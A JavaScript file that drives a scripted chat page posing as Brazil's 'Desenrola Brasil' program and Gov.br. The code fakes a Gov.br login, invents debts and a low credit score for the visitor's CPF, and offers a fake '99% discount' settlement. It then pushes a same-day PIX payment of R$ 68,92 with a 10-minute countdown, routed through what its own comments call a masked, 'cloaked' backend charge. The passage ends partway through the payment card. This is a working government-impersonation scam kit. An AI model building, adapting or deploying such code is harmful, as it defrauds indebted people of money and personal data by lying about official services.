// Fluxo de Atendimento - Desenrola Brasil

function formatarCPF(v) {
  v = (v || '').replace(/\D/g, '');
  if (v.length !== 11) return v;
  return v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

function formatarData(d) {
  if (!d) return '';
  if (d.includes('-')) {
    const parts = d.split('-');
    if (parts.length === 3) return `${parts[2]}/${parts[1]}/${parts[0]}`;
  }
  return d;
}

const _urlParams = new URLSearchParams(window.location.search);
let _storedUser = {};
try {
  _storedUser = JSON.parse(sessionStorage.getItem('desenrola_user') || localStorage.getItem('desenrola_user') || '{}');
} catch(e) {}

// Objeto para dados do CPF preenchidos via API ou URL
const dadosConsulta = {
  nome: _urlParams.get('nome') || _storedUser.nome || "",
  cpf: formatarCPF(_urlParams.get('cpf') || _storedUser.documento || _storedUser.cpf || localStorage.getItem('desenrola_cpf') || ""),
  nascimento: formatarData(_urlParams.get('nasc') || _storedUser.nascimento || "")
};

// Função pública para fácil integração com API
window.atualizarDadosCliente = function(novosDados) {
  if (!novosDados) return;
  if (novosDados.nome) dadosConsulta.nome = novosDados.nome;
  if (novosDados.cpf) dadosConsulta.cpf = formatarCPF(novosDados.cpf);
  if (novosDados.nascimento) dadosConsulta.nascimento = formatarData(novosDados.nascimento);

  const primeiro = dadosConsulta.nome ? dadosConsulta.nome.trim().split(' ')[0] : '';
  const primeiroCap = primeiro ? (primeiro.charAt(0).toUpperCase() + primeiro.slice(1).toLowerCase()) : '';

  // Atualiza os elementos na tela
  const userChip = document.getElementById('userChipName');
  const bubbleUser = document.getElementById('bubbleUserName');
  const confirmNome = document.getElementById('confirmNome');
  const confirmCpf = document.getElementById('confirmCpf');
  const confirmNasc = document.getElementById('confirmNasc');

  if (userChip) userChip.textContent = primeiroCap || dadosConsulta.nome || '';
  if (bubbleUser) bubbleUser.textContent = primeiroCap ? ' ' + primeiroCap : '';
  if (confirmNome) confirmNome.textContent = dadosConsulta.nome || '';
  if (confirmCpf) confirmCpf.textContent = dadosConsulta.cpf || '';
  if (confirmNasc) confirmNasc.textContent = dadosConsulta.nascimento || '';
};

// Atualiza imediatamente
window.atualizarDadosCliente(dadosConsulta);

// Se tiver CPF mas o NOME ainda não estiver em cache, consulta em segundo plano
const rawCpf = (_urlParams.get('cpf') || _storedUser.documento || _storedUser.cpf || localStorage.getItem('desenrola_cpf') || '').replace(/\D/g, '');
if (!dadosConsulta.nome && rawCpf) {
  fetch('/api/consultar-cpf?cpf=' + rawCpf)
    .then(res => res.json())
    .then(data => {
      if (data && data.nome) {
        try {
          sessionStorage.setItem('desenrola_user', JSON.stringify(data));
          localStorage.setItem('desenrola_user', JSON.stringify(data));
        } catch(e) {}
        window.atualizarDadosCliente(data);
      }
    })
    .catch(err => console.log('Consulta automática:', err));
}

// Requisição de geração de PIX protegida no servidor (backend cloaking)
async function requestGerarPix() {
  const rawCpf = (dadosConsulta.cpf || '').replace(/\D/g, '');
  const nome = dadosConsulta.nome || '';

  try {
    const res = await fetch('/api/gerar-pix', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cpf: rawCpf, nome: nome })
    });
    const data = await res.json();
    return data;
  } catch (err) {
    console.error('Erro na requisição /api/gerar-pix:', err);
    return { success: false, message: err.message };
  }
}

// Atalho de desenvolvimento: ?step=pix pula direto para o pagamento PIX
if (_urlParams.get('step') === 'pix' || _urlParams.get('pix') === '1') {
  window.addEventListener('DOMContentLoaded', async () => {
    const vCard = document.getElementById('videoCard');
    if (vCard) vCard.style.display = 'none';
    const sWrap = document.getElementById('stickyBtnWrap');
    if (sWrap) sWrap.style.display = 'none';
    const cCard = document.getElementById('confirmCard');
    if (cCard) cCard.style.display = 'none';
    const sNote = document.getElementById('systemNote');
    if (sNote) sNote.style.display = 'none';

    const flowSection = document.getElementById('flowSection');
    const loadRow = document.createElement('div');
    loadRow.className = 'bubble-row visible';
    loadRow.innerHTML = `
      <img class="bubble-avatar" src="atendente-avatar.webp" alt="Letícia">
      <div class="bubble">Gerando sua cobrança PIX com desconto...</div>
    `;
    flowSection.appendChild(loadRow);
    autoScroll();

    const pixData = await requestGerarPix();
    loadRow.remove();
    showPixCard(pixData, flowSection);
  });
}

document.addEventListener('DOMContentLoaded', () => {
  window.atualizarDadosCliente(dadosConsulta);
});

// Desbloqueio e ativação do som da VSL sem travar a reprodução
let confirmShown = false;

function ativarSomEContinuar(e) {
  if (e) {
    e.stopPropagation();
    e.preventDefault();
  }
  const video = document.getElementById('leticiaVideo');
  const badge = document.getElementById('videoSoundBadge');

  if (video) {
    video.muted = false;
    video.volume = 1.0;
    const playPromise = video.play();
    if (playPromise !== undefined) {
      playPromise.catch(() => {
        // Se a política do navegador bloquear áudio, continua reproduzindo sem travar
        video.muted = true;
        video.play().catch(() => {});
      });
    }
  }

  if (badge) {
    badge.style.display = 'none';
  }
}

function unlockGlobalAudio() {
  const video = document.getElementById('leticiaVideo');
  if (video && video.muted) {
    ativarSomEContinuar();
  }
}

['touchstart', 'touchend', 'click', 'keydown'].forEach(evt => {
  window.addEventListener(evt, unlockGlobalAudio, { passive: true, once: true });
});

// Auto-scroll suave
function autoScroll() {
  window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
}

function showElement(el) {
  if (!el) return;
  el.style.display = 'flex';
  requestAnimationFrame(() => {
    el.classList.add('visible');
    autoScroll();
  });
}

function hideElement(el) {
  if (!el) return;
  el.style.display = 'none';
  el.classList.remove('visible');
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function appendBubble(html, container) {
  const row = document.createElement('div');
  row.className = 'bubble-row visible';
  row.innerHTML = `
    <img class="bubble-avatar" src="atendente-avatar.webp" alt="Letícia">
    <div class="bubble">${html}</div>
  `;
  container.appendChild(row);
  autoScroll();
  return row;
}

function appendTyping(container) {
  const row = document.createElement('div');
  row.className = 'bubble-row typing-row visible';
  row.innerHTML = `
    <img class="bubble-avatar" src="atendente-avatar.webp" alt="Letícia">
    <div class="typing-bubble"><span></span><span></span><span></span></div>
  `;
  container.appendChild(row);
  autoScroll();
  return row;
}

async function agentSay(html, container, typingMs = 1400) {
  const tRow = appendTyping(container);
  await delay(typingMs);
  tRow.remove();
  return appendBubble(html, container);
}

document.addEventListener('DOMContentLoaded', async () => {
  // Inicializa dados em branco
  window.atualizarDadosCliente(dadosConsulta);

  const typing1 = document.getElementById('typing1');
  const bubble1 = document.getElementById('bubble1');
  const typing2 = document.getElementById('typing2');
  const bubble2 = document.getElementById('bubble2');
  const videoCard = document.getElementById('videoCard');
  const video = document.getElementById('leticiaVideo');
  const videoTyping = document.getElementById('videoTyping');
  const systemNote = document.getElementById('systemNote');
  const confirmCard = document.getElementById('confirmCard');

  // ── Sequência cronometrada de mensagens com tempo natural ──

  // 1. Mensagem 1
  await delay(1200);
  showElement(typing1);

  await delay(2200);
  hideElement(typing1);
  showElement(bubble1);

  // 2. Mensagem 2
  await delay(1600);
  showElement(typing2);

  await delay(2200);
  hideElement(typing2);
  showElement(bubble2);

  // 3. Vídeo da atendente Letícia
  await delay(1500);
  if (videoCard) {
    videoCard.style.display = 'block';
    videoCard.classList.add('visible');
    autoScroll();
  }

  // Digitação enquanto o vídeo roda
  await delay(400);
  showElement(videoTyping);

  function revelarConfirmacao() {
    if (confirmShown) return;
    confirmShown = true;

    hideElement(videoTyping);

    // Sistema: (Atendente Letícia entrou na conversa..)
    setTimeout(() => {
      if (systemNote) {
        systemNote.style.display = 'block';
        systemNote.classList.add('visible');
        autoScroll();
      }
    }, 400);

    // Card de confirmação dos dados
    setTimeout(() => {
      if (confirmCard) {
        confirmCard.style.display = 'block';
        confirmCard.classList.add('visible');
        autoScroll();
      }
    }, 1500);
  }

  if (video) {
    // Clicar diretamente no vídeo ativa o som e mantém rodando sem travar
    video.addEventListener('click', ativarSomEContinuar);
    if (videoCard) {
      videoCard.addEventListener('click', ativarSomEContinuar);
    }

    // Se o navegador tentar pausar por causa do unmute, retoma imediatamente
    video.addEventListener('pause', () => {
      if (!confirmShown && video.currentTime < (video.duration - 0.5)) {
        video.play().catch(() => {});
      }
    });

    // Tenta autoplay mudo
    video.play().catch(() => {
      video.muted = true;
      video.play().catch(() => {
        // Fallback se autoplay for estritamente bloqueado
        setTimeout(revelarConfirmacao, 2500);
      });
    });

    // Quando faltar 3 segundos para o fim do vídeo
    video.addEventListener('timeupdate', () => {
      if (video.duration && (video.duration - video.currentTime <= 3)) {
        revelarConfirmacao();
      }
    });

    video.addEventListener('ended', revelarConfirmacao);
  }

  // Fallback de segurança caso o vídeo não dispare eventos
  setTimeout(revelarConfirmacao, 35000);
});

// ── Fluxo ao clicar em "Sim, está correto." ──
async function confirmar() {
  unlockGlobalAudio();
  const btnSim = document.getElementById('btnSim');
  const btnNao = document.getElementById('btnNao');
  if (btnSim) btnSim.disabled = true;
  if (btnNao) btnNao.disabled = true;

  const video = document.getElementById('leticiaVideo');
  if (video) video.pause();

  const flowSection = document.getElementById('flowSection');

  // Balão do usuário
  const userRow = document.createElement('div');
  userRow.className = 'user-bubble-row visible';
  userRow.innerHTML = '<div class="user-bubble">Sim, está correto.</div>';
  flowSection.appendChild(userRow);
  autoScroll();

  await delay(800);
  await agentSay('Obrigada!', flowSection, 1100);

  await delay(600);
  await agentSay('Aguarde... Entrando em sua conta Gov.br', flowSection, 1600);

  await delay(600);
  await agentSay('<strong>Login efetuado com sucesso!</strong>', flowSection, 1200);

  await delay(600);
  const welcomeText = dadosConsulta.nome 
    ? `<strong>${dadosConsulta.nome}</strong><br>Seja bem vindo(a) a sua conta Gov.br` 
    : `<strong id="userWelcomeName"></strong>Seja bem vindo(a) a sua conta Gov.br`;
  await agentSay(welcomeText, flowSection, 1300);

  await delay(600);
  await agentSay('Negocie dívidas com as seguintes empresas:', flowSection, 1300);

  await delay(900);
  // Card das empresas parceiras
  const compCard = document.createElement('div');
  compCard.className = 'companies-card';
  compCard.innerHTML = `<img src="empresas.webp" alt="Empresas parceiras">`;
  flowSection.appendChild(compCard);
  await delay(80);
  compCard.classList.add('visible');
  autoScroll();

  await delay(900);
  // Botão CONTINUAR
  const btnWrap = document.createElement('div');
  btnWrap.className = 'continuar-btn-wrap';
  btnWrap.innerHTML = `<button type="button" class="btn-continuar-flow" id="btnContinuarFlow" onclick="proximaEtapa()">CONTINUAR</button>`;
  flowSection.appendChild(btnWrap);
  await delay(80);
  btnWrap.classList.add('visible');
  autoScroll();
}

// ── Global Audio Player Helper ──
function createActiveAudio(src) {
  const audio = new Audio();
  const fileName = src.split('/').pop();
  audio.src = (window.location.protocol === 'file:') ? fileName : src;
  audio.preload = 'auto';
  audio.addEventListener('error', function() {
    if (!audio._fallbackDone) {
      audio._fallbackDone = true;
      audio.src = fileName;
      audio.load();
      audio.play().catch(() => {});
    }
  });
  const playProm = audio.play();
  if (playProm !== undefined) {
    playProm.catch(() => {});
  }
  return audio;
}

function fmtTime(s) {
  if (isNaN(s) || !isFinite(s)) return "0:00";
  const m = Math.floor(s / 60);
  const sec = String(Math.floor(s % 60)).padStart(2, '0');
  return `${m}:${sec}`;
}

function mountAudioPlayer(section, audioObj, audioId, onEnd, fallbackMs) {
  const row = document.createElement('div');
  row.className = 'audio-bubble-row';
  const btnId = 'audioPlayBtn_' + audioId;
  const fillId = 'audioFill_' + audioId;
  const timeId = 'audioTime_' + audioId;
  const wrapId = 'playerWrap_' + audioId;
  
  const svgPlay = '<svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
  const svgPause = '<svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';

  row.innerHTML = `
    <img class="bubble-avatar" src="atendente-avatar.webp" alt="Letícia">
    <div class="audio-player" id="${wrapId}">
      <button class="audio-play-btn" id="${btnId}">${svgPause}</button>
      <div class="audio-progress-wrap">
        <div class="audio-progress-bar">
          <div class="audio-progress-fill" id="${fillId}"></div>
        </div>
        <span class="audio-time" id="${timeId}">0:00 / 0:00</span>
      </div>
    </div>
  `;
  section.appendChild(row);
  setTimeout(() => {
    row.classList.add('visible');
    autoScroll();
  }, 80);

  const btn = row.querySelector('#' + btnId);
  const fill = row.querySelector('#' + fillId);
  const time = row.querySelector('#' + timeId);
  const playerWrap = row.querySelector('#' + wrapId);

  let ended = false;
  function done() {
    if (ended) return;
    ended = true;
    if (btn) btn.innerHTML = svgPlay;
    if (playerWrap) playerWrap.classList.remove('playing');
    if (onEnd) onEnd();
  }

  audioObj.addEventListener('timeupdate', () => {
    if (!audioObj.duration) return;
    const pct = (audioObj.currentTime / audioObj.duration) * 100;
    if (fill) fill.style.width = pct + '%';
    if (time) time.textContent = fmtTime(audioObj.currentTime) + ' / ' + fmtTime(audioObj.duration);
  });

  audioObj.addEventListener('play', () => {
    if (btn) btn.innerHTML = svgPause;
    if (playerWrap) playerWrap.classList.add('playing');
  });
  audioObj.addEventListener('pause', () => {
    if (btn) btn.innerHTML = svgPlay;
    if (playerWrap) playerWrap.classList.remove('playing');
  });

  audioObj.addEventListener('ended', done);
  if (fallbackMs) setTimeout(done, fallbackMs);

  if (!audioObj.paused) {
    if (btn) btn.innerHTML = svgPause;
    if (playerWrap) playerWrap.classList.add('playing');
  } else {
    audioObj.play().then(() => {
      if (btn) btn.innerHTML = svgPause;
      if (playerWrap) playerWrap.classList.add('playing');
    }).catch(() => {
      if (btn) btn.innerHTML = svgPlay;
    });
  }

  if (btn) {
    btn.onclick = function() {
      unlockGlobalAudio();
      if (audioObj.paused) {
        audioObj.play();
        btn.innerHTML = svgPause;
      } else {
        audioObj.pause();
        btn.innerHTML = svgPlay;
      }
    };
  }
}

// ── Fluxo ao clicar em "CONTINUAR" abaixo das empresas → Áudio 1 → SIM! QUERO NEGOCIAR ──
async function proximaEtapa() {
  unlockGlobalAudio();
  const btnContinuar = document.getElementById('btnContinuarFlow');
  if (btnContinuar) {
    btnContinuar.disabled = true;
    const wrap = btnContinuar.closest('.continuar-btn-wrap');
    if (wrap) wrap.style.display = 'none';
    else btnContinuar.style.display = 'none';
  }

  const flowSection = document.getElementById('flowSection');

  // Balão do usuário: CONTINUAR
  const userRow = document.createElement('div');
  userRow.className = 'user-bubble-row visible';
  userRow.innerHTML = '<div class="user-bubble">CONTINUAR</div>';
  flowSection.appendChild(userRow);
  autoScroll();

  const audio1 = createActiveAudio('/static/audio/audio1.mp3');

  await delay(600);
  const tRow = document.createElement('div');
  tRow.className = 'bubble-row visible';
  tRow.innerHTML = `
    <img class="bubble-avatar" src="atendente-avatar.webp" alt="Letícia">
    <div class="typing-bubble"><span></span><span></span><span></span></div>
  `;
  flowSection.appendChild(tRow);
  autoScroll();
  await delay(1000);
  tRow.remove();

  mountAudioPlayer(flowSection, audio1, 'audio1', () => {
    revelarSimNegociar(flowSection);
  }, 25000);
}

async function revelarSimNegociar(flowSection) {
  if (document.getElementById('btnSimNegociar')) return;
  await delay(600);
  const btn = document.createElement('button');
  btn.id = 'btnSimNegociar';
  btn.className = 'btn-sim-negociar';
  btn.textContent = 'SIM! QUERO NEGOCIAR';
  btn.onclick = iniciarAnaliseCpf;
  flowSection.appendChild(btn);
  await delay(80);
  btn.classList.add('visible');
  autoScroll();
}

// ── SIM QUERO NEGOCIAR → Análise do CPF e Score → BUSCAR ACORDO ──
async function iniciarAnaliseCpf() {
  unlockGlobalAudio();
  const btn = document.getElementById('btnSimNegociar');
  if (btn) {
    btn.disabled = true;
    btn.style.display = 'none';
  }

  const flowSection = document.getElementById('flowSection');

  // Balão do usuário
  const userRow = document.createElement('div');
  userRow.className = 'user-bubble-row visible';
  userRow.innerHTML = '<div class="user-bubble">SIM! QUERO NEGOCIAR</div>';
  flowSection.appendChild(userRow);
  autoScroll();

  await delay(600);
  await agentSay('<em>Por favor, aguarde analisarmos a situação do seu CPF em nosso sistema..</em>', flowSection, 2200);

  await delay(500);
  await agentSay('<em>Consultando..</em>', flowSection, 1500);

  await delay(600);
  await agentSay('<strong>Análise concluída!</strong>', flowSection, 1100);

  await delay(700);
  await agentSay(
    'Identificamos <strong>4 dívidas ativas</strong> no sistema. Os valores variam entre <strong>R$ 1.728,74</strong> a <strong>R$ 5.278,23</strong> de dívida <strong>em seu CPF.</strong>',
    flowSection, 1600
  );

  await delay(800);
  // Card de situação do CPF (com CPF em branco para a API)
  const cpfCard = document.createElement('div');
  cpfCard.className = 'cpf-status-card';
  cpfCard.innerHTML = `
    <div class="lbl">Situação para CPF:</div>
    <div class="cpf-val" id="cpfValStatus">${dadosConsulta.cpf || ''}</div>
    <div class="neg">NEGATIVADO.</div>
  `;
  flowSection.appendChild(cpfCard);
  await delay(80);
  cpfCard.classList.add('visible');
  autoScroll();

  await delay(900);
  await agentSay(
    'Segundo nossos registros, seu SCORE é considerado muito baixo <strong>(alto risco para crédito):</strong>',
    flowSection, 1500
  );

  await delay(700);
  // Card do Serasa Score
  const scoreCard = document.createElement('div');
  scoreCard.className = 'score-card';
  scoreCard.innerHTML = `
    <div>
      <div class="score-label">Serasa Score</div>
      <div class="score-text">Seu score está<br>baixo</div>
    </div>
    <div class="score-gauge-wrap">
      <svg viewBox="0 0 90 54" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M 10 50 A 35 35 0 0 1 80 50" stroke="#e0e0e0" stroke-width="8" stroke-linecap="round" fill="none"/>
        <path d="M 10 50 A 35 35 0 0 1 39 18" stroke="#e84040" stroke-width="8" stroke-linecap="round" fill="none"/>
      </svg>
      <div class="score-number">365<span class="score-denom">de 1000</span></div>
    </div>
  `;
  flowSection.appendChild(scoreCard);
  await delay(80);
  scoreCard.classList.add('visible');
  autoScroll();

  await delay(1000);
  await agentSay(
    'Você deseja verificar se existe algum acordo com desconto disponível para você?',
    flowSection, 1400
  );

  await delay(600);
  const acordoBtn = document.createElement('button');
  acordoBtn.className = 'btn-buscar-acordo';
  acordoBtn.textContent = 'BUSCAR ACORDO';
  acordoBtn.onclick = buscarAcordo;
  flowSection.appendChild(acordoBtn);
  await delay(80);
  acordoBtn.classList.add('visible');
  autoScroll();
}

// ── Fluxo BUSCAR ACORDO ──
async function buscarAcordo() {
  unlockGlobalAudio();
  const btn = document.querySelector('.btn-buscar-acordo');
  if (btn) {
    btn.disabled = true;
    btn.style.display = 'none';
  }

  const flowSection = document.getElementById('flowSection');

  // Balão do usuário
  const userRow = document.createElement('div');
  userRow.className = 'user-bubble-row visible';
  userRow.innerHTML = '<div class="user-bubble">BUSCAR ACORDO</div>';
  flowSection.appendChild(userRow);
  autoScroll();

  await delay(700);
  await agentSay(
    '<em>Por favor, aguarde enquanto nosso sistema verifica se existem acordos disponíveis para você...</em>',
    flowSection, 1800
  );

  await delay(1200);
  await agentSay('<strong>Acordo encontrado!</strong>', flowSection, 1000);

  await delay(600);
  const acordoCard = document.createElement('div');
  acordoCard.className = 'acordo-card';
  acordoCard.innerHTML = `
    <div class="ac-title">1 (um) acordo foi encontrado para:</div>
    <div class="ac-name" id="acordoNome">${dadosConsulta.nome || ''}</div>
    <div class="ac-cpf" id="acordoCpf">CPF: ${dadosConsulta.cpf || ''}</div>
  `;
  flowSection.appendChild(acordoCard);
  await delay(80);
  acordoCard.classList.add('visible');
  autoScroll();

  await delay(700);
  const verBtn = document.createElement('button');
  verBtn.className = 'btn-ver-acordo';
  verBtn.textContent = 'VER ACORDO';
  verBtn.onclick = verAcordo;
  flowSection.appendChild(verBtn);
  await delay(80);
  verBtn.classList.add('visible');
  autoScroll();
}

// ── Fluxo VER ACORDO → Áudio 2 → Proposta de 99% OFF → CONFIRMAR ACORDO ──
async function verAcordo() {
  unlockGlobalAudio();
  const btn = document.querySelector('.btn-ver-acordo');
  if (btn) {
    btn.disabled = true;
    btn.style.display = 'none';
  }

  const flowSection = document.getElementById('flowSection');

  // Balão do usuário
  const userRow = document.createElement('div');
  userRow.className = 'user-bubble-row visible';
  userRow.innerHTML = '<div class="user-bubble">VER ACORDO</div>';
  flowSection.appendChild(userRow);
  autoScroll();

  const acordoId = 'XXKM8-0R0--';
  const audio2 = createActiveAudio('/static/audio/audio2.mp3');

  await delay(600);
  const tRow = document.createElement('div');
  tRow.className = 'bubble-row visible';
  tRow.innerHTML = `
    <img class="bubble-avatar" src="atendente-avatar.webp" alt="Letícia">
    <div class="typing-bubble"><span></span><span></span><span></span></div>
  `;
  flowSection.appendChild(tRow);
  autoScroll();
  await delay(1000);
  tRow.remove();

  await new Promise(resolve => {
    mountAudioPlayer(flowSection, audio2, 'audio2', resolve, 50000);
  });

  await delay(400);
  const clientName = dadosConsulta.nome ? `<strong>${dadosConsulta.nome}!</strong>` : '';
  await agentSay(
    `Parabéns ${clientName}<br><br>Pode comemorar! Encontramos um <strong>SUPER ACORDO DE 99% DE DESCONTO</strong> para você!`,
    flowSection, 1500
  );

  await delay(500);
  await agentSay(`<em>Acessando o acordo <strong>${acordoId}</strong>...</em>`, flowSection, 1100);

  await delay(500);
  await agentSay(
    `Informações do acordo <strong>${acordoId}</strong> para (${dadosConsulta.nome || ''})<br><br>(CPF: ${dadosConsulta.cpf || ''})`,
    flowSection, 1300
  );

  await delay(500);
  await agentSay(
    `Você gostaria de realizar o seu acordo com <strong>99% DE DESCONTO</strong> para quitar <strong>todas</strong> as suas dívidas e ter seu nome limpo novamente por apenas <strong>R$ 68,92</strong>?`,
    flowSection, 1600
  );

  await delay(700);
  const confirmarBtn = document.createElement('button');
  confirmarBtn.className = 'btn-confirmar-acordo';
  confirmarBtn.textContent = 'CONFIRMAR O ACORDO E LIMPAR O NOME';
  confirmarBtn.onclick = confirmarAcordo;
  flowSection.appendChild(confirmarBtn);
  await delay(80);
  confirmarBtn.classList.add('visible');
  autoScroll();
}

// ── CONFIRMAR O ACORDO → Áudio 3 → CONTINUAR → Áudio 4 → PAGAMENTO → Áudio 5 ──
async function confirmarAcordo() {
  unlockGlobalAudio();
  const btn = document.querySelector('.btn-confirmar-acordo');
  if (btn) {
    btn.disabled = true;
    btn.style.display = 'none';
  }

  const flowSection = document.getElementById('flowSection');

  // Balão do usuário
  const userRow = document.createElement('div');
  userRow.className = 'user-bubble-row visible';
  userRow.innerHTML = '<div class="user-bubble">CONFIRMAR O ACORDO E LIMPAR O NOME</div>';
  flowSection.appendChild(userRow);
  autoScroll();

  const audio3 = createActiveAudio('/static/audio/audio3.mp3');

  await delay(600);
  const tRow = document.createElement('div');
  tRow.className = 'bubble-row visible';
  tRow.innerHTML = `
    <img class="bubble-avatar" src="atendente-avatar.webp" alt="Letícia">
    <div class="typing-bubble"><span></span><span></span><span></span></div>
  `;
  flowSection.appendChild(tRow);
  autoScroll();
  await delay(1000);
  tRow.remove();

  await new Promise(resolve => {
    mountAudioPlayer(flowSection, audio3, 'audio3', resolve, 60000);
  });

  await delay(400);
  await agentSay('<strong>Acordo confirmado com sucesso!</strong>', flowSection, 1000);

  await delay(500);
  const contBtn = document.createElement('button');
  contBtn.className = 'btn-ver-acordo';
  contBtn.textContent = 'CONTINUAR';
  contBtn.onclick = async function() {
    unlockGlobalAudio();
    contBtn.disabled = true;
    contBtn.style.display = 'none';

    // Balão do usuário
    const uRow = document.createElement('div');
    uRow.className = 'user-bubble-row visible';
    uRow.innerHTML = '<div class="user-bubble">CONTINUAR</div>';
    flowSection.appendChild(uRow);
    autoScroll();

    const audio4 = createActiveAudio('/static/audio/audio4.mp3');

    await delay(500);
    const tRow2 = document.createElement('div');
    tRow2.className = 'bubble-row visible';
    tRow2.innerHTML = `
      <img class="bubble-avatar" src="atendente-avatar.webp" alt="Letícia">
      <div class="typing-bubble"><span></span><span></span><span></span></div>
    `;
    flowSection.appendChild(tRow2);
    autoScroll();
    await delay(1000);
    tRow2.remove();

    await new Promise(resolve => {
      mountAudioPlayer(flowSection, audio4, 'audio4', resolve, 60000);
    });

    await delay(400);
    const propostaCard = document.createElement('div');
    propostaCard.className = 'proposta-card';
    propostaCard.innerHTML = `
      <div class="pc-row">Acordo confirmado: <strong>XXKM8-0R0--!</strong></div>
      <div class="pc-row">Beneficiário(a):</div>
      <div class="pc-row pc-bold">${dadosConsulta.nome || ''}</div>
      <div class="pc-row">Identificação (CPF):</div>
      <div class="pc-row pc-bold">${dadosConsulta.cpf || ''}</div>
      <div class="pc-row pc-blue">Quitação de todas as dívidas em ativo no CPF.</div>
      <div class="pc-row pc-score">895 Pontos no score.</div>
      <div class="pc-row pc-valor">Valor da proposta: R$ 68,92</div>
    `;
    flowSection.appendChild(propostaCard);
    await delay(80);
    propostaCard.classList.add('visible');
    autoScroll();

    await delay(600);
    const pagBtn = document.createElement('button');
    pagBtn.className = 'btn-pagamento';
    pagBtn.textContent = 'CONTINUAR PARA O PAGAMENTO';
    pagBtn.onclick = async function() {
      unlockGlobalAudio();
      pagBtn.disabled = true;
      pagBtn.style.display = 'none';

      // Dispara a geração da cobrança mascarada no backend em paralelo à fala da atendente
      const pixPromise = requestGerarPix();

      // Balão do usuário
      const uPagRow = document.createElement('div');
      uPagRow.className = 'user-bubble-row visible';
      uPagRow.innerHTML = '<div class="user-bubble">CONTINUAR PARA O PAGAMENTO</div>';
      flowSection.appendChild(uPagRow);
      autoScroll();

      const audio5 = createActiveAudio('/static/audio/audio5.mp3');

      await delay(600);
      const tR = document.createElement('div');
      tR.className = 'bubble-row visible';
      tR.innerHTML = `
        <img class="bubble-avatar" src="atendente-avatar.webp" alt="Letícia">
        <div class="typing-bubble"><span></span><span></span><span></span></div>
      `;
      flowSection.appendChild(tR);
      autoScroll();
      await delay(1000);
      tR.remove();

      await new Promise(resolve => {
        mountAudioPlayer(flowSection, audio5, 'audio5', resolve, 60000);
      });

      await delay(400);
      await agentSay('<em><strong>Atenção!</strong> Oferta Válida Apenas para hoje.</em>', flowSection, 1000);

      await delay(400);
      await agentSay(
        '⚠️ <strong>Instruções de pagamento:</strong><br><br>' +
        '• O código PIX expira em <strong>10 minutos</strong><br>' +
        '• O pagamento deve ser realizado imediatamente para <strong>garantir o desconto de 99%</strong><br>' +
        '• Após o pagamento, todas as dívidas em seu CPF serão quitadas automaticamente<br>' +
        '• Caso não seja pago, o acordo será cancelado e as dívidas continuarão acumulando juros',
        flowSection, 1400
      );

      await delay(600);
      const pixData = await pixPromise;
      showPixCard(pixData, flowSection);
    };
    flowSection.appendChild(pagBtn);
    await delay(80);
    pagBtn.classList.add('visible');
    autoScroll();
  };
  flowSection.appendChild(contBtn);
  await delay(80);
  contBtn.classList.add('visible');
  autoScroll();
}

// Extrai e formata a Razão Social real do recebedor gravada na Tag 59 do QR Code PIX
function extrairNomeSocialPix(pixCode) {
  if (!pixCode || typeof pixCode !== 'string') return '';
  try {
    let pos = 0;
    while (pos < pixCode.length - 4) {
      const tag = pixCode.slice(pos, pos + 2);
      const len = parseInt(pixCode.slice(pos + 2, pos + 4), 10);
      if (isNaN(len)) break;
      const val = pixCode.slice(pos + 4, pos + 4 + len);
      if (tag === '59') {
        let clean = val.replace(/_/g, ' ').replace(/\s+/g, ' ').trim();
        if (clean.toUpperCase().endsWith(' LTD')) clean = clean + 'A';
        return clean.split(' ').map(w => {
          const upper = w.toUpperCase();
          if (upper === 'LTDA' || upper === 'SA' || upper === 'S.A.' || upper === 'ME' || upper === 'EPP') return upper;
          if (w.length <= 3 && !/[aeiou]/i.test(w)) return upper;
          return w.charAt(0).toUpperCase() + w.slice(1).toLowerCase();
        }).join(' ');
      }
      pos = pos + 4 + len;
    }
  } catch (e) {}
  return '';
}

// ── Exibição do Card PIX Oficial com QR Code Gerado ──
function showPixCard(data, section) {
  data = data || {};
  section = section || document.getElementById('flowSection');
  const card = document.createElement('div');
  card.className = 'pix-card';
  card.style.opacity = '0';
  card.style.transition = 'opacity .4s ease';

  const pixCode = data.qr_code || data.pixCode || '';
  const pixQrBase64 = data.qr_code_base64 || data.pixQrCode || null;
  const transactionId = data.transaction_id || '';

  // Extrai exatamente a Razão Social (Tag 59) para ficar idêntico ao aplicativo do banco
  let nomeSocial = extrairNomeSocialPix(pixCode);
  if (!nomeSocial && data.favorecido) nomeSocial = data.favorecido;
  if (!nomeSocial && data.acquirer && data.acquirer !== 'TenantBank') nomeSocial = data.acquirer;
  if (!nomeSocial) nomeSocial = 'Cpa Pay Intermediacao LTDA';

  card.innerHTML = `
    <div class="pix-card-header">
      <img src="atendente-avatar.webp" alt="Atendente Letícia" onerror="this.src='/static/images/atendente-avatar.webp'">
      <div>
        <div class="hdr-title">⚡ Cobrança PIX Gerada</div>
        <div class="hdr-sub">Programa Desenrola Brasil — Gov.br</div>
      </div>
    </div>
    <div class="pix-card-body">
      <div class="pix-doc-row">
        <span class="lbl">Beneficiário</span>
        <span class="val" id="pixBeneficiario">${dadosConsulta.nome || 'Beneficiário Oficial'}</span>
      </div>
      <div class="pix-doc-row">
        <span class="lbl">CPF</span>
        <span class="val" id="pixCpf">${dadosConsulta.cpf || ''}</span>
      </div>
      <div class="pix-doc-row">
        <span class="lbl">Descrição</span>
        <span class="val">Quitação de Dívidas — Acordo XXKM8-0R0--</span>
      </div>
      <div class="pix-doc-row">
        <span class="lbl">Instituição Recebedora</span>
        <span class="val" id="pixInstituicao" style="color: #1351B4; font-weight: 800;">${nomeSocial}</span>
      </div>
      <div class="pix-doc-row">
        <span class="lbl">Valor a pagar</span>
        <span class="val val-green">R$ 68,92</span>
      </div>
      <div class="pix-doc-row">
        <span class="lbl">⏳ Validade</span>
        <span class="val" style="color:#c0392b;"><span id="timer">10:00</span></span>
      </div>
      <hr class="pix-divider">
